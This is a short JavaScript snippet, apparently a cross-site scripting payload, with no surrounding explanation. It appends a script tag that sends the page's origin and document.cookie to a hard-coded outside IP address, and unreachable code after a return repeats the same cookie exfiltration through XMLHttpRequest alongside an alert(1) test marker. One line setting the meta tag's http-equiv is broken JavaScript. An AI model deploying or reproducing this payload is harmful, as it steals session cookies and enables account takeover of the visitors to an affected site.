(function(){
    let meta = document.createElement('meta');
    meta.content="upgrade-insecure-requests";
    meta.http-equiv="Content-Security-Policy"
    document.getElementsByTagName('head')[0].appendChild(meta);
    
    
    let script=document.createElement("script");
    script.type="text/JavaScript";
    script.src= "http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie;
    document.getElementsByTagName('head')[0].appendChild(script);
    
    return;
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
    httpRequest.send();
    alert(1)
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            console.log(json);
        }
    };
})()
